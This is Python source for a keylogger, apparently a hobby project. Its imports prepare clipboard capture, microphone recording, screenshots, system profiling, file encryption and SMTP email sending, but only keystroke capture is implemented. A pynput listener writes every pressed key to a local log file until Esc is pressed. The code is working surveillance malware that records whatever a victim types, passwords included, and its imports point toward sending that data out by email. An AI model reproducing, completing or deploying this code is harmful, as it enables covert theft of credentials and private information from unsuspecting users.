# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

    # to collect computer info
import socket
import platform

    # the clipboard
import win32clipboard

    # grab keystrokes
from pynput.keyboard import Key, Listener

    # track time
import time
import os

    # microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

    # to encrypt files
from cryptography.fernet import Fernet

import getpass              # to get usernames
from requests import get    # to get computer information

from multiprocessing import Process, freeze_support         # to get one screenshot at a time
from PIL import ImageGrab                                   # to grab images


keys_information = "key_log.txt"

file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
extend = "\\"

count = 0
keys = [] # each pressed key will be appended here

# function to print and append pressed key to keys list
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# function to write the keys to key_log.txt file
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        # joining each individual letters to form the typed word
        for key in keys:
            # replacing ' with nothing
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

# function to exit KeyLogger
def on_release(key):
    if key == Key.esc:
        return False

# calling listener
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
